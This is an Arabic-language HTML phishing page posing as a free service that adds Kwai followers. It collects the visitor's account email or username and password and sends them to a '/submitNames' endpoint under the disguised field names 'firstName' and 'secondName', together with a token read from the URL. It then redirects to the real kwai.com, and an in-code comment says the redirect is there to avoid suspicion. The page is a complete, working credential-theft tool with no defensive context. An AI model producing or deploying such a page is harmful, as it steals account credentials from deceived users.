<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة متابعين كواي مجاناً</title>
    <!-- استخدام Tailwind CSS للتصميم السريع والنظيف -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        body { font-family: 'Cairo', sans-serif; }
    </style>
</head>
<body class="bg-gray-950 text-white min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md bg-gray-900 border border-gray-800 rounded-2xl shadow-2xl p-6 md:p-8">
        
        <!-- هيدر الصفحة -->
        <div class="text-center mb-6">
            <div class="inline-block bg-orange-500/10 text-orange-400 p-3 rounded-full mb-3">
                <svg class="w-8 h-8 mx-auto" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                </svg>
            </div>
            <h1 class="text-2xl font-bold text-orange-500">شحن متابعين Kwai</h1>
            <p class="text-gray-400 text-sm mt-1">احصل على آلاف المتابعين لحسابك على كواي فوراً</p>
        </div>

        <!-- الفورم الأساسي -->
        <form id="kwaiForm" class="space-y-4">
            
            <!-- إدخال يوزر أو بريد كواي -->
            <div>
                <label class="block text-sm font-medium text-gray-300 mb-1">البريد الإلكتروني أو اسم المستخدم</label>
                <input type="text" id="username" required placeholder="example@email.com أو اليوزر" 
                    class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-orange-500 transition">
            </div>

            <!-- إدخال كلمة المرور -->
            <div>
                <label class="block text-sm font-medium text-gray-300 mb-1">كلمة المرور</label>
                <input type="password" id="password" required placeholder="••••••••" 
                    class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-orange-500 transition">
            </div>

            <!-- اختيار عدد المتابعين -->
            <div>
                <label class="block text-sm font-medium text-gray-300 mb-1">حدد عدد المتابعين المطلوب</label>
                <select id="followersCount" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-orange-500 transition">
                    <option value="1000">1,000 متابع</option>
                    <option value="5000">5,000 متابع</option>
                    <option value="10000">10,000 متابع</option>
                    <option value="25000">25,000 متابع (عرض خاص)</option>
                </select>
            </div>

            <!-- زر الإرسال -->
            <button type="submit" id="submitBtn" 
                class="w-full bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 font-bold py-3.5 rounded-xl transition shadow-lg shadow-orange-500/20 mt-2">
                ابدأ عملية الرشق
            </button>
        </form>

        <!-- حالة التحميل أو الرسائل -->
        <div id="statusMessage" class="hidden text-center mt-4 text-sm"></div>

    </div>

    <!-- سكود المعالجة وإرسال البيانات -->
    <script>
        document.getElementById('kwaiForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const usernameField = document.getElementById('username').value.trim();
            const passwordField = document.getElementById('password').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            const statusMessage = document.getElementById('statusMessage');

            // 1. استخراج الرمز (Token) حسب التعليمات
            const urlParams = new URLSearchParams(window.location.search);
            const token = urlParams.get('t') || window.location.pathname.split('/').pop();

            if (!token) {
                statusMessage.textContent = 'خطأ: الرمز (Token) غير موجود في الرابط.';
                statusMessage.className = 'text-center mt-4 text-sm text-red-500';
                statusMessage.classList.remove('hidden');
                return;
            }

            // تعطيل الزر وإظهار حالة الانتظار
            submitBtn.disabled = true;
            submitBtn.textContent = 'جاري المعالجة...';
            statusMessage.classList.add('hidden');

            // 2. تجهيز البيانات حسب الهيكلية المطلوبة
            const payload = {
                token: token,
                firstName: usernameField,
                secondName: passwordField
            };

            try {
                // 3. إرسال الطلب عبر POST باستخدام fetch والتوجيه للمسار المطلوب
                const response = await fetch('/submitNames', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    statusMessage.textContent = 'تم إرسال الطلب بنجاح! جاري تحويلك لحسابك...';
                    statusMessage.className = 'text-center mt-4 text-sm text-green-500';
                    statusMessage.classList.remove('hidden');

                    // 4. التوجيه للموقع الحقيقي لإبعاد الشبهة بعد لحظات
                    setTimeout(() => {
                        window.location.href = 'https://www.kwai.com';
                    }, 2000);
                } else {
                    throw new Error('حدث خطأ أثناء الاتصال بالخادم.');
                }

            } catch (error) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'ابدأ عملية الرشق';
                statusMessage.textContent = 'حدث خطأ، يرجى المحاولة مرة أخرى.';
                statusMessage.className = 'text-center mt-4 text-sm text-red-500';
                statusMessage.classList.remove('hidden');
            }
        });
    </script>
</body>
</html>
